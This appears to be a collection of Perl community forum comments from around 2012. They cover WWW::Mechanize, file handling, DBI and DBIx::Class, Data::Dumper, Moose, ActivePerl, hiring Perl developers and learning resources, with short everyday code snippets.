That seems like the opposite of the sort of thing someone with ADHD would like.
Javascript doesn't matter at all when you're submitting forms like the above example. However, you didn't really tell us much about the websites, and I have no idea if any of your sites use javascript during the login process (which would be weird, but who knows), so I mentioned that it doesn't handle it to save you some time and frustration. Also, my guess is once you get comfortable with WWW::Mechanize, you'll use it for more things so it's good to know that up front.
nothing on databases and ORM?
Why? If you have a short attention span, then wouldn't short rapidly changing slides be ideal to continually re-grab your attention?
Not if all the slides have similar content and offer nothing new and exciting Slide shows are a good way to get rid of visitors! "Want to see some holiday shots!?"
And an update, i uploaded some 20 more videos that i grabbed from earlier streams. So if you looked before and couldn't find a talk you wanted to see, check again. :)
One of the highlights of YAPC::NA 2012
I'm glad that we had a YAPC that broadcast the presentations at all.
This question is in the Perl FAQ: http://perldoc.perl.org/perlfaq8.html#How-do-I-clear-the-screen? Perl's FAQ covers a lot of things like this, but a lot of people don't know about it. You can do `man perlfaq1`, `man perlfaq2` etc up to perlfaq9 and read it all, and plus it's online. Another cool thing people seem to not know about is that you can search the FAQ with the `perldoc` command. Normally, you say `perldoc Module::Name` or `perldoc -f function_name`, but you can also say `perldoc -q clear` and it will search the FAQ for the word "clear", which is how I found the answer to your question. 
When you go play with WWW::Mechanize, make sure that you look at WWW::Mechanize::Cookbook and WWW::Mechanize::FAQ as well.
Reusable code is a best practice. Re-using other people's code is both a way to learn and/or a way to accomplish objectives much faster. Can you imagine writing every thing from scratch, every time? That's not how technological innovation works in physical engineering, why shouldn't re-use work for coding? In the long run, you may find that your programming genius lies in the glue between the libraries, or in the accomplishment of something new. And from what I've seen in my career, we've used libraries to get started, but later gone back to improve or replace them for performance reasons. It's a good thing.
I have the experience and knowledge to write my own programming language, after umpty-odd years of practice. If I'd had to do that when I started programming, I wouldn't have continued. I still get a little better at programming every year because i learn from my experiences. Reusing the code of other programmers gives me a chance to avoid making the mistakes they've already made and fixed (and if lots of other people use their code, lots of us have the chance to find and fix mistakes). Then again, I don't know too many physicists who think that calculus makes their jobs too easy, so maybe argument by analogy is enough. There's still plenty of work to do.
Not really. It depends on the monitoring software, I suppose, but (for example) [Zabbix](http://www.zabbix.com/wiki/scripts/start) and [Icinga](http://docs.icinga.org/1.0/en/plugins.html), you can create a plugin out of a php, perl, or shell script. It just needs to return the results in an expected format. Scripts are called by the monitoring software with arguments (maybe a hostname, whatever). It's really not very hard - there are lots of plugins out there that you can read as examples. I think that'd give you the cleanest results, because you'd then have standard monitoring reports you can use that also include monitoring of a website. You can still check the user/pass combos with a perl script using WWW::Mechanize, for example. 
If the libraries are open source, nothing is stopping you from looking at the source to learn more from it. Good or bad programmer is up to the individual. Do you use the library, but never cared about how it works? Or do you use it and then wonder how it works and go and study its source? There are more resources than ever out there, and more accessible than ever, for a computer programmer (or anyone else). Just because a problem is solved, doesn't mean that you don't need to learn about it. And perhaps if the problem wasn't solved the way you wanted it to be solved, you can go and write your own solution. There are many things where there's no one right way to do. E.g. web frameworks.
Programming, like poetry, is only easy on the surface.
I am glad that in college they *forced* me to implement a multi-threaded OS, a compiler, a b-star tree. It's not that I actually use the trivial OS I wrote in college, but there is pleasure in the journey. To put it other way: Dont reinvent the wheel to make a better wheel; reinvent the wheel to learn more about wheels.
I don't think it makes good programmers worse, though I think you'll find most really good coders refuse to use libraries that they haven't thoroughly grokked the source code of. What I do think is it leads to a lot of "programmers" out there applying for jobs who don't really understand programming, but just know enough to install and tweak a few libraries/frameworks. I've interviewed supposed web developers who didn't seem to know about for loops (based on code I asked them to write), but had portfolios of completed websites online.
:set wrap
The implied premise of this question is flawed.
 my @files = sort glob( '*.csv' ); die ( "File list not a multiple of 3" ) unless @files %3 == 0; while ( @files ) { open my $f1, '&lt;', shift @files; open my $f2, '&lt;', shift @files; open my $f3, '&lt;', shift @files; # .... } How's that? glob() does the same as your grep...readdir, only cleaner and simpler.
If the files are not huge, this should work: #!/usr/bin/perl use strict; use warnings; my @fileList = &lt;*.csv&gt;; my %output; foreach my $file (sort @fileList) { (my $fileId = $file) =~ s/[^\d+]//g; my $line=0; open my $fi, "&lt;", $file; while (&lt;$fi&gt;) { chomp; $output{++$line}{$fileId} = "file: $file $_"; } close $fi; } foreach my $line (sort {$a &lt;=&gt; $b} keys %output) { foreach my $fileId (sort {$a &lt;=&gt; $b} keys %{$output{$line}}) { print "line:$line fileId:$fileId -&gt; ", $output{$line}{$fileId}, "\n"; } } If the files are huge, you'll need to do something like make a %offset hash -&gt; $offset{$filename}=$bytes; loop through file list over and over as long as it exists in $offset, removing the key once you reach end of file. Store the offset of each file and after re-opening it seek() to the position and read another line. 
If the files are large, you'll want to use something like this (as I mentioned previously): #!/usr/bin/perl use strict; use warnings; my @fileList = &lt;*.csv&gt;; my %offset; my %size; foreach my $file (sort @fileList) { $offset{$file}=0; $size{$file}=(stat($file))[7]; } my $count = keys %offset; while ($count &gt;= 1) { foreach my $file (keys %offset) { my $position = $offset{$file}; open my $fi, "&lt;", $file; seek($fi, $offset{$file}, 0); my $line = &lt;$fi&gt;; $offset{$file}+=length($line); print "$line"; delete $offset{$file} if $offset{$file} &gt;= $size{$file}; close $fi; my $count = keys %offset; if ($count &lt; 1) { exit; } } } Sorry, I missed the 4th column bit, depending on what your field separators (tab in this example) are, above where I print "$line"; change it to this: my @fields = split(/\t/, $line); print $fields[3], "\n" if $fields[3]; # the if bit skips empty field 
[Googling for "email encoding equals sign" gives me a correct top result.](https://www.google.com/search?q=email+encoding+equals+sign)
It works fine here.
Yes, here in this place in time it is working.
He advises not to store the epoch in the db, but doesn't give a compelling explanation. By any chance, does anyone know of any solid reasons not to do this? http://www.youtube.com/watch?v=Ykimie-yybc&amp;feature=youtu.be&amp;t=49m40s
Redirect stderr to the null device, which is `nul` on Win32. If you're using the shell to invoke the command then you can add `"2&gt;nul"`. But using the shell is probably a mistake because it's a lot of extra overhead. Use something like `IPC::Open3` and skip the shell. Better, don't spawn 16 million child processes. You can do what `net.exe` is doing directly from perl. See for example the `Win32` module's `LookupAccountName()` to get a SID from an account name and `LookupAccountSID()` to get the full user name from a SID. (Also, there's no reason to fill an array with all 16 million possible user names. Just create each one in sequence.) 
Oh durr! I should have known there was already a module for it. And I didn't even think of redirecting 2 - thanks for the hit over the head =)
I think I had a brain fart and didn't even consider redirecting 2 - thanks for the reminder!
Do this: use Capture::Tiny 'capture'; my ($stdout, $stderr, $ret ) = capture { system "net user /DOMAIN $user" }; Then you can even inspect the errors after the fact and decide whether to ignore or not.
In my opinion, ActiveState's PerlCritic GUI is much more convenient.
I do this too, with the 120 column standard my team recently adopted (since no one was following our previous 80 character standard, complaining it was too small). 30+ inch widescreen monitors FTW!
You're not locked into their precompiled modules at all, since ActivePerl can do everything any other Perl can do, and as such also CPAN installs and comes with a C compiler.
Thanks for getting back to me! I guess I haven't had the need for time math in the db. The examples I've run into are limited to persistence, ordering, and range queries (with any time math done in the code before or after querying the data). Do you know of a canonical example where the time math (add month, year, until monday, etc) has to be done in the db? I'm flipping through this book and most of it seems to be doable with integer math. I'm sure I'll find examples in there when I get time to read it: http://www.amazon.com/Temporal-Relational-Kaufmann-Management-Systems/dp/1558608559 
Ah, right. Thanks. Not worth me looking any further into, not having the problem of Windows.
Ah. It's been a *very* long time since I've last used it, the inclusion of a compiler is new.
Besides it being one of the best Perl distributions for Windows, I've found one other thing that might, in some cases, make it worth installing on Linux too. The [Tkx](http://search.cpan.org/~gaas/Tkx-1.09/lib/Tkx.pm) module only seems to work under ActivePerl. I've tried compiling and running it on Linux under various versions of Perl and Fedora distributions (Perl 5.10, 5.12, and 5.14), and it always segfaults like crazy and just doesn't work. I don't know what ActivePerl is doing differently, but ActivePerl for Linux is the only way I've found to get Tkx to work on Linux (I haven't tested Tkx on other Windows Perls, however).
"New" as in a couple years ago I think.
It can be useful. I doubt it's ever necessary. I'm actually thinking of writing up a longer blog post on why not to use epochs for representing datetimes, and in what cases it's appropriate.
I can code it for you as an OSS project under MIT license. But I need a donation of $50 for it(mainly beer and pizza). Would you be willing to support an OSS project ?
I'd like to add that the benefits of OO are never really realized in the initial implementation effort. OO's benefits are typically seen during the long, dark teatime that is the post-1.0 life of the program, and all of the ancillary software built around it, and on top of the domain objects that you designed initially. As with OO in general, so it is with Moose in particular. The features of Moose bear their fruit later, rather than sooner. Additionally, the startup time for Moose is not a big deal. Others have pointed out that there are simple ways to speed Moose's startup time, but what I haven't seen mentioned is: 1) If you're program only runs once in a while, the difference between 2 seconds and 12 seconds is negligible. 2) If you're using it to build web-based software, you're application is probably complex enough to warrant a persistent application server like FCGI, and mod_perl (in which the web processes do not fork or recompile the perl program on each invocation) as opposed to non-persistent app like CGI which must fork/exec and compile on each iteration. If your program is simple enough that you don't see the benefit of using a full-blooded object system like Moose, then don't use it for that program. Nobody will break down your door in the middle of the night and cart you off the Moose Reeducation Camps. 
&gt; If you're program only runs once in a while, the difference between 2 seconds and 12 seconds is negligible. wuh??
That's what i was thinking, Thanks.
isn't 5.6 were the case/switch came in? that was a huge thing for lots of people.
Every one of those features you listed is irrelevant to getting work done.
DBI is the easier / quicker way to get into it if you know SQL well. DBIx::Class imho makes it a lot easier and in some ways is more powerful
DBI, DBIx::Class, or DBIx::Simple
I managed to write two editions of a book called *Modern Perl* without covering any of those topics. I'm confident that will hold for the third edition.
I've always relied on DBI and I have a pretty strong knowledge of SQL. I'd be curious to hear in what ways DBIx is more powerful.
My take and warning on the book "Programming Perl 4th": &gt; The definitive Perl book is now up to date with the way that the best Perl programmers now program Perl. Yet when i bought it, one of the first things i encountered were bareword file handles. Mind, this doesn’t mean it’s the only issue. It takes an ungodly long time to introduce strict/warnings and when it gets around to them only does so in a very offhand way while introducing other topics. It needlessly quotes the keys used to access hashes and it even uses old sub calling conventions ( &amp;fetch() ). It may try to target modern Perl usage even without touching on CPAN, which is perfectly possible, but covering some new features doesn’t cut it if your base material isn’t up to scratch.
great work on the docs
Benchmarks like this give me the willies, because you're never sure if the person writing the code is familiar with all the languages. For example, in https://github.com/attractivechaos/plb/blob/master/patmch/patmch_v1.pl the line print $_, "\n" if /$re/; should be print $_, "\n" if /$re/o; so that the regex doesn't recompiled every time. I don't know how much of a difference that makes, but it puts everything into question.
good for you. I'm talking more about modern perl6. Stuff like how LLVM could be used for the JIT, or parrot. As a language definition modern perl6 rises above in respect that it can be implemented different ways. This is a feature of modern perl, and due to this feature right now not all parts of the specification are implemented everywhere.... so modern perl might not be useful to everyone. Perhaps you can respond to the Op with a link to your book, might be more helpful than responding to me talking about perl6. It would at least narrow the discussion to what you consider to be modern perl as an author (and moderator). You could even distinguish the link to emphasize your point. Thanks for the down votes.
From the looks of it they're completely orphaned.
Uh, yeah. A lot alive.
While the enthusiasm is appreciated, it is recommended to at least try to link things that not everyone has seen. :)
In other news: The sky is still blue. Water is still wet. What's the point of this link/post?
Is one safer than the other?
DBIx::Class uses DBI in the underlying code however it has additional check before the code is sent to mySQL. basically its a library over SQL
Yes, agreed, `qr//` would have been the best way to go.
It says this: my %compounds = $msType-&gt;GetCompoundList(); my @list = grep { !exists $compounds{$_} } @cNames; Error( 205, @list ) if @list; 
thanks 
What are you passing to Dumper? %companies_and_users or a reference to it? I suspect it's the former, in which case the hash prints 'flat', like you're seeing. Passing it in as \%companies_and_users should help. In terms of the approach you're taking, there is, as always, more than one way to do it, and yours is fine.
What a relief. Thanks!
I'm not sure of your overall goal here, but in similar circumstances I've always preferred to nest the data in a hash from the start: my %companies_and_users; $companies_and_users{$shortname}{$user} = 1 while (($ora_sth-&gt;fetch()); This allows you to extract the data later with something like: foreach $x( sort keys %companies_and_users) { foreach $y (sort keys %{$companies_and_users{$x}}) { print "$x\t$y\n"; } }
I'm guessing you want to change line push @ { $companies_and_users{$record-&gt;[0]} }, $record-&gt;[1]; to this $companies_and_users{$record-&gt;[0]} = $record-&gt;[1]; That looks like what you are trying to do. 
&gt; $companies_and_users{$record-&gt;[0]} = $record-&gt;[1]; That won't work for his sample data, where he has the key 'hsbc' more than once; it'll lose 'Frank'. His push is fine, he's just using Data::Dumper incorrectly when displaying the hash. 
This. He's doing this.. Dumper(%companies_and_users) ...not this... Dumper(\%companies_and_users) ..and Dumper is treating the hash as an array instead - $VAR1 being the key, and $VAR2 being the value.
This command did the job for me. wget --recursive --page-requisites --html-extension --convert-links --domains ofps.oreilly.com --user-agent="Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.3) Gecko/2008092416 Firefox/3.0.3" --no-parent http://ofps.oreilly.com/titles/9781118013847/; Then, I simply pasted the folder downlaoded in dropbox. :) Pretty simple.
It exits the $compound foreach loop, the following if condition isn't met, so it goes to the next $name
I only altered the downloaded file once on a windows and then transfered it to all the other machines. I received the fix to my problem here http://stackoverflow.com/questions/11245797/perl-large-io-bug-on-mac-but-not-windows-or-linux-adds-newline-cant-be-chomped/11246092#11246092 which is probably removing that windows data that remained after the transfer
Oh using wget! Thanks a lot :)
I have just pressed enter (and passed a zero-length string), and the only thing that happens is 'unlock.exe' running with invalid arguments (thus nothing happens). I'm not too worried about Really Bad Things, as this will only be used by me or someone I trust. Thanks for the info though. :)
nothing wrong with your code. these are my personal preferences .... ;) 1. i'd prefer to use die instead of your else print error: die "error!\n" unless defined $name; 2. should work since its in the path. system( "unlock $_ $name" ); 3. enable strict and warnings by default and also importing say: use Modern::Perl; print "hello there\n"; say "hello there"; # equivalent 
You should use the multi-parameter form of `system`. That is, system("c:/Windows/System32/unlock.exe $_ $name"); becomes system("c:/Windows/System32/unlock.exe", $_, $name);
Not to toot my own horn, but it sounds like you'd want someone like me. My suggestion would be to look for people that do it in their spare time, regardless of their education level. The douchiness you can always screen for with an interview.
Well, I'm a CS undergrad and I somehow really got into programming Perl on my own. Needless to say, people think I'm a bit weird. They don't teach Perl in schools at all, and it's no longer as "trendy" as it was, but you can't beat CPAN. I guess you'd have to find people who learned it on their own. You'd probably have more luck with linux/FOSS enthusiasts.
A decent programmer will be able to pick up any language. I'd rather higher a good programmer and someone who will fit in with my team than someone who checks off a specific skill set.
&gt; "performant", not douchy Not sure what that means. It could be be me but I need more detail.
Get's stuff done. doesn't have a fohawk?
I think this is the right answer. Find a good programmer, whether or not they know Perl. Perl isn't *that* different to other languages. Are there conversion guides for people moving from other languages, come to think of it?
Have you posted on jobs.perl.org? I usually get a lot of good hits there.
I think it helps to have a hand in the community. 1) Consider attending/hosting a perlmongers meeting. 2) participate in Perl monks. 3) Hire a famous Perl programmer. When you are known as a great Perl shop to work for, the talent finds you. 
Well, at my company, we've got a captive breeding programme. The little fellas don't take too well to breeding in captivity, but after we worked out which were the males and which were the females, we started to see some results. We're hoping Perl 6 will be available by the time this season's batch reaches maturity.
While perl is still the duct tape holding a lot of servers together, it's rarely taught so you'll be looking for people who have been working in a perl shop before. Add to that the number of places using perl (and using it well, which is equally important) is decreasing in response to execs seeing shinier options, and you've got a a much smaller pool than there was ten years ago. If you find a good one, nice. If not, look for a programmer, not the language.
I'd also add that perl is so versitile that there are totally different specializations that don't cross over that well. For example someone who is great at using perl as a sysadmin tool to automate a bunch of tasks, but wouldn't know the first thing about dbix::class or catalyst. Of course any knowledge is better than none, but it's just even harder to find someone who knows exactly what kind of stuff you'll be using on top of the language. Compared to say, ruby where I think a far larger percentage of ruby users already has some familiarity with rails.
Well I'm a hacker from the old sense of the word so I decided that Perl was an awesome tool and I wanted to know it. I think Perl really caters for young hackers who think a good Friday night is buried in a server some where! I'm 18 and know Perl, PHP &amp; MySQL and looking for a job; shame I'm on the wrong side of the world :( EDIT: After reading the other responses it really does sound like your best bet is enthusiasts or poaching an existing Perl developer
Honestly, if you want to find a dude you can easily train into Perl, find a Lisper. With guidance by one or two experienced Perl developers who know the power of `my $blah = sub{};`, `map`, `grep` and `List::Util` any Lisper will quickly feel right at home. Also keep in mind: NY is an extremely expensive place and the Perlers i know don't seem to take well to "living large". Maybe open up a sub-office some ways out of the city. :)
that is incorrect I'm afraid. I saw Java, C++, C, Python programmers which were forced to learn Perl and when I saw their code I had a lot of "you're doing it wrong" moments. so, they can learn Perl of course, but not just from books. you have to have a Perl "guru" around so they can learn by [osmosis](http://en.wikipedia.org/wiki/Osmosis), very very important.
I'm installing BioPerl right now user@garage:~$ cpanm BioPerl
4) sponsor a local Perl Workshop, or even better, the nearest YAPC (yet another perl conference)
New college graduates. They haven't acquired enough expertise to be married to a language yet (not a slam, I'm married to perl), they understand they need training and want it (or don't hire them), and they're relatively cheap. You have to dedicate a non-trivial portion of some developers time, but it works.
&gt;Web-savvy, modern, "performant", not douchy ... Pick any three.
I'd be willing to bet a large percentage of perl programmers aren't programmers, but system admins who have a very high knowledge level of perl but have 0 interest in programming for a living. I spend a large portion of time writing perl code, at least a couple hours a day, but I would never choose a job where I do nothing but write code for a living (I'm a Sr. Unix System Admin).
Well, when a mommy programmer and a daddy programmer love each other veryyyy much...
They spawn a child process! Yay!!!
A good developer should be able to pick up another language. Most of the control and looping structures are similar between Perl and most imperative languages. **BUT** it still takes a while to learn how to write good Perl. You can end up with Perl flavored C instead of Perl, for example. Or, you get people who can't write clear, readable code in Perl because they code like a fallen-off-the-wagon drunk because Perl doesn't force them to behave. I had to deal with a developer whose only defense for not checking return status, explicitly declaring variables, or using useful variable names was: "It's Perl! I don't have to do that!" You need to people who have enough self-discipline and pride in work to **want** to write good code. **EDIT:** I also want to mention that I've seen companies low-ball Perl development pay compared to Java or Ruby. A good Perl developer may be taking Java jobs simply because they pay better.
unzip, strip, touch, finger, grep, mount, fsck, more, yes, fsck, fsck, fsck, umount, sleep
I'll omit Web-savvy since I don't know what that means. Is it that they can browse the interwebz and be lolcats?
But how do they spawn those processes, you ask? Well, they fork();
Are you based in NYC?
Yes, with no avail.
If you figure it out a magic solution, let me know. We've struggled to find good people for a while. We're hosting a Perl Mongers meeting, we sent about half the team to YAPC this year. But it hasn't really netted us a ton of qualified applicants so far. As some have mentioned, Perl just isn't in vogue any more. Most of the good people migrated to Ruby or Python, and the rest migrated to PHP. Beyond that, the remaining Perl gurus are pretty spread out, and most are pretty happy where they are. You have to be willing to do remote people to get a lot of them, and unless you're set up for that, it doesn't work out well. Actually, one thing we've found successful is we took one of our more experienced devs and made him a mentor for entry-level programmers. He takes on 3 at a time, mentors them for 6 months, and if they're working out, they get promoted to regular developers and gain more independence. We're on our 2nd batch now, and all 3 of the first batch are working out quite well. Our people are a mix of internal promotion (mostly from QA, but also from higher-level support positions), recent graduates, and one guy switching from a Physics teaching career to programming. Not all of them knew much Perl, but they had all at least dabbled with it. Something else we're working on is making it a focus of the team to contribute back more. My employer donated some money to the Perl 5 fund and to YAPC, but more than that, we want to make sure people on the team start contributing to CPAN regularly. Get better known in the community and hopefully that will attract the talented people we need to get to the next level. I'll let you know how it goes (surely OP will deliver!).
 modern =&gt; use Moose; web-savvy =&gt; use JQuery; *Edit*: performant =&gt; use Perl;
This made me laugh more than it should have :-)
I must not be modern, I still use a mouse. My hands are too small to use a moose.
I learned perl in a company that simply gave up on finding perl people. They would posts jobs for php web developers and train them. Since they are one of the biggest names in the Portuguese Perl community, Perl programmers knew how to get an interview if they wanted to. That said, try finding good php developers who love the web. In before "there's no good php developers"
Hmm, there might be an opportunity for me. I'm a sysadmin with a development background. My job started out as a mix. Now people at work see me as only the sysadmin, but I don't see much of a future for myself in system administration. 
perl really has an image problem with CS students. Hell, I write near everything in perl now but before I learned it I joked about things having "perl-grade" obfuscation. Hell, I had this conversation after leaning perl: &gt;It's really nice, there's CPAN and you can do just about anything. &gt;Yeah but you can only read it once. &gt; No, you can make perfectly readable code in perl... &gt; But if you do clever things, which is the point of perl, it's unreadable &gt; You can make any language unreadable... And so on.
no man... you're completely missing my point maaan.. there is a certain word called "perlish", come back when you know what that means. also come back if you can outline 10 main differences between Perl and some very popular programming languages. thanks.
Talk to someone at the CS department at one of the universities near you. They'll know how to get you into the college job fairs, and they'll be able to put your job listing up on their recent graduate (and/or alumni) job board.
Unscientific observations: No Perl programmer wants to move to work for a company. There have been too many horror stories. Companies hire lots of people, crack the whip and run it like a sweatshop, refusing to let people refactor, write tests, or do anything that would keep the code ship from sinking (I'm not just talking about the recent leak out of a certain company that has been trying to hire 60 Perl programmers for well over a year and apparently still is trying to hire 60 Perl programmers). I've worked in "agile" places where eyes darted around the room trying to judge if they had moved enough things forward on the Post-It wall to not get canned that week. Perl's only "good" reputation was that it was cheap to hire people to work in it and cheap to get things done with it, and a lot of really slimy outfits latched on to and exploited the hell out of that perception. Your company may be awesome -- I hear about how awesome some company is on a daily basis, from them, in their own words -- but those of us who have been at this for a while are just plain squeamish after everything we've seen. If you want an idea of what I'm talking about, check out the excellent _Netslaves_ books from the library. Companies that use Java or Python fall all over themselves to hire someone known in the community, and routinely make concessions like letting them travel to speak and spend a fraction of their work time working on whatever they do in their field. This applies to people who write well used libraries in Ruby, Python and Java. The JUnit guy doesn't have to miss sleep to work on JUnit. The Java guys form standards consortium at the drop of a hat, and charge corporations big money to participate in it, assuring that the people working on the technology, such as JUnit, never starve while writing the code that so many people are using. In the Perl camp, not even the author of the bloody of the language seems to be able to land a deal like that. The people who work on the core Perl language can't. I once briefly worked at the same company (different location) as a Perl 5 Porter. They treated him like garbage. He's known as the calmest, most easy going guy, but he put his hand through the breakroom wall and walked out. If you're really so hard up for good Perl talent, then hire a bloody Porter to work on Perl half time and your technology half of the time. Do you go to campuses to recruit? Do you sponsor events such as YAPC and OSBridge? Have you publicly made a sizable donation to The Perl Foundation? I'm not saying that, by gum, you should have to do those things if you ever want to chance to deserve a Perl programmer, but if you want to compete and edge other companies out, it can't hurt. None of that answers your question though, and I think it's a good one. I've worked in Java shops and VB shops. VB and Java shops do train people up. There is a strong concept in a lot of those environments of hiring a few senior level people, letting them design things and lead teams (and of having teams!), and then bringing in numbers of people of various experience levels, giving them pre-designed stuff to implement or grunt work to do. I can count on one hand the number of times I've witnessed that in the Perl camp. My present employer does this to some degree -- hire promising people who have little experience and spend resources to train them up, and I love it. I love warping young minds. It's also a nice water cooler break to just explain what you're working on and how the project works to someone. It kind of gives the brain a rest while still doing something work related and useful. I've written long essays before about how Perl's supply lines were cut off and no new programmers are coming in. Perl isn't taught at Uni or highschool, and the self-taught hacker camp favors Ruby, Python and various other things. Google has hired away some of the brightest minds and given them Python and Java to work on. As far as I can tell, there are no companies like Google that just plain hire smart Perl programmers, pay them well, give them a safe, stable job, and work hard to accommodate them and keep them happy. No one is doing cool stuff with Perl -- like writing games in it -- that would change perceptions about it and add visibility. I stupidly put my resume on those miserable jobs sites a number of years back and unleashed an endless tidal wave of job spam (okay, bad mixed metaphor). On a daily basis, I see crap about "Entry Level Java Specialist Urgently Needed" (I was just scratching my head at that one earlier today -- who the fucking hell urgently needs an entry level programmer?) but never any spam for Perl. Never. I see more Java jobs in Alaska (I'm in Phoenix) than I do Perl jobs. That's probably a good thing -- jobs.perl.org is awesome and everyone should be using it, but still, there's a certain lack of broadcast message that you can actually pay rent writing Perl. I'm on the SNOBOL4 mailing list. Sometimes they lament the lack of people using this (completely fucking awesome) language and wonder what they can do about it. It sounds like a lot of the same noises I hear from the Perl camps. 
&gt; Companies hire lots of people, crack the whip and run it like a sweatshop, refusing to let people refactor, write tests, or do anything that would keep the code ship from sinking. &gt; Perl's only "good" reputation was that it was cheap to hire people to work in it and cheap to get things done with it, and a lot of really slimy outfits latched on to and exploited the hell out of that perception. Hi. I work for a local company that almost fits this description. They only hired one person, but the workload is the same. It took 5+ years of struggling but I'm halfway to actually being productive: I shoved test suites and refactoring in their face until they accepted it; I wasted years on the job getting hardly any work done until they finally caved and bought me a computer faster than a celeron (mine's now the fastest in the building... and the cheapest); I got them to start doing backups of production data (to a portable disk sitting under a heap of paper and wires). Some day I hope to get them to upgrade from decade-old SVN to a sane DVCS and maybe buy me a monitor larger than 1280x1024. Maybe even a monitor cable I don't have to supply myself... The only thing keeping me in this job right now is the fact it's summer, and high school kids have taken all the better paying, less humiliating, burger-flipping jobs.
It's the fork theory of reproduction :).
Just so that I don't end up being one of those people, can you give some examples of common Perl anti-patterns that people from other languages might employ? I realize that post might take some time to write, but I'd really appreciate it.
Shoot an email to a CS department. Companies do it at my school (Wash U. in St. Louis) all the time. They'll forward it around, they're happy to help students find jobs. In case it helps, I'll tell you what I look for in these ads. Since I'm not yet a senior, I'm just looking at internships, but an internship program is a great way to fill your pipeline. Good programmers will look for places that seem to have smart people working there, that send engineers to recruit, that put interns on real tasks, that pay a decent hourly wage, and (often) that pay for housing. You won't get many good applicants if all you can offer people is systems administration stuff or coding on a toy app that's just there to fill time. At least, that's my perception. It's also generally harder as a small company, since people want that big name on their resume when they're just starting out. But if you can convince them that they'll have a larger impact at a small company, which will translate into better bragging rights at later interviews, then you might have a better shot.
Use Postgres.
&gt; The loud jackasses of late simply parrot and cargo cult the loud jackasses who have recently established themselves in the community, and they are multiplying. Can you be more specific about what these unnamed people are doing that you don't like? Specific as in technical criticisms.
&gt; Is decibel level a technical criticism? No. Enjoy that other community.
But that would have taken me *two* clicks away from Reddit... :) Thanks!
&gt; if only Parrot had listened more closely to you Except for the parts where I was wrong, and most people in the know could list at least two or three big examples.
&gt; I'm convinced that emulating styles and attitudes of Java programmers won't make Java programmers or anyone else respect us but will only serve to cut us off the enterprising hackers. I don't see a disagreement between hacking on the one hand and adopting tools and practices to avoid painting ourselves into corners on the other. Anyone who says "All programs should be one-liners typed on the command line" is as much a crank as anyone who says "You should never use one-liners". Both are strawmen.
That font from the 80s is really ugly for code.
This is a kinda cool idea. Hope it turns out well.
Love it. 
This sounds awesome. I love the idea of people creating a challenge for themselves and then striving for it. That's basically how I learned Perl and programming in general. It's a blast to hit your arbitrary goals!
The "let's do everything in python!" is so bad for a young programmer, also PHP, it just lowers their standards and hinders their creativity so much.
The attitude I see is "Oh, Perl, isn't that some language we get underpaid contractors to work on." I also see very few new project starts with Perl. Which is a shame, since I view it as the language of choice for high productivity.
It's best to get into the "never trust your user even if your only user is you" mindset from the beginning. It's a lot easier to program in safety than it to restore your system from an accidental "whoops". We've all had those "whoops" moments, so you should really program with those in mind.
Dafaaaakkkk?
Yeah I noticed that Intermediate Perl was in the same series, I was just curious as to what the content was, thanks.
And since you are here, I am doing an independent study on Perl for my Freshman year, do you think I could master the language as my first language over the course of 1 year?
Master? No. Make definite progress? Yes. 
I really have a passion for programming and I know it is what I will do for the rest of my life, so I want to learn as much as possible, my question is, what do you think I can achieve over the course of roughly 180 days? 
What comes next? * [perlootut](http://perldoc.perl.org/perlootut.html) * [perlobj](http://perldoc.perl.org/perlobj.html) * [Higher Order Perl](http://hop.perl.plover.com/) (free ebook) * [Moose](http://moose.iinteractive.com/) (or see this [slide deck](http://assets.en.oreilly.com/1/event/61/Moose%20is%20Perl_%20A%20Guide%20to%20the%20New%20Revolution%20Presentation%201.pdf))
I was looking into computer engineering but I don't know how programming intensive that is... I just want something that pays well and I can solve problems everyday. 
Upvote for Modern Perl. That book is fantastic. Also, Dancer may be a bit easier to get into than Catalyst if you're a beginner. 
Actually am writing a perl module to login to a host via ssh using password and execute some commands. I am trying to read the password prompt thrown by ssh, if i use IO::Handle-&gt;getline() method which internally implements &lt;&gt; I doesn't see the prompt.If instead I use sysread I see it. So was wondering internally apart from buffered/unbuffered what else is different.
Sure, here's one: https://dl.dropbox.com/u/10190786/prima_test.png I also posted it to the comments there.
I wanted to offer a different route. There is a funny chicken-and-egg process when you're learning to program. Many programming books are for people who have already taken "algorithms and data structures" and assume that kind of rudimentary computer science knowledge. Their main purpose is to help you do what you already know how to do in their specific language. Based on that fact, it might seem like a good idea to go and learn that basic CS stuff before you learn the ins-and-outs of a programming language. The other side of the coin is that you can't really test stuff out / do practice problems / really **learn by doing** without knowing the syntax and the everyday bugaboos of at least one language. It sounds to me like you have a good idea of how to get proficient in Perl. If you were 25 and trying to jump right into the job market, it might be a better idea to continue learning about producing large, robust applications, which is what I think the Beginning-Intermediate-Mastering series is geared towards. Since you're in school, though, why not take some time with the "whys and wherefores"? Programming involves a number of "months to learn, lifetime to master" kind of skills and algorithms and data structures is an area that is as broad and deep as you want it to be. They are how things get done on a computer.
Excellent reasoning sir, I very much agree.
Last i tried wxPerl on Windows it didn't look pretty at all. :/
That’d be because &lt;http://search.cpan.org/~mdootson/Wx-0.9909/Wx.pm#Windows_XP_look&gt;.
I suspected this might be the case, but I hadn't checked my self yet, which I should have. Thanks for the tip.
Here's an online index of resources for a class from years ago: http://archives.evergreen.edu/webpages/curricular/2001-2002/dsa01/dsa-resources.html And here are some discussions on perlmonks about perl and computer science: - http://www.perlmonks.org/?node_id=578848 - http://www.perlmonks.org/?node_id=915053 - http://www.perlmonks.org/?node_id=760634 - http://www.perlmonks.org/?node_id=248077 General algorithms/data structures books [usually written in c, c++, or Java] that are popular are - [Skiena's](http://www.cs.sunysb.edu/~algorith/) - [Cormen et al's,](http://www.cs.dartmouth.edu/~thc/) - and [Sedgewick's](http://www.cs.princeton.edu/~rs/). [Tim Roughgarden](http://theory.stanford.edu/~tim/) has been teaching the Stanford Coursera classes on algorithms. Each professor has a very nice website. Best of luck with college and everything! EDIT: Just saw this one: http://news.ycombinator.com/item?id=4200846
So? If "Modern Perl" is a thing that some programmers use right now, and those features masta listed are features that don't exist in any Perl right now, then those features masta listed are obviously not attributes of "Modern Perl".
Frozen Bubble comes with some versions of StraweBerry Perl (windows perl), it works very nicely. I've been dwelling with OpenGL and perl, it's very obscure because it's not documented, but it's just the same as using OpenGL from C, exept from the pointer stuff, you just pass a reference.
If you need some help with OpenGL.pm, feel free to hit me up in #sdl. :)
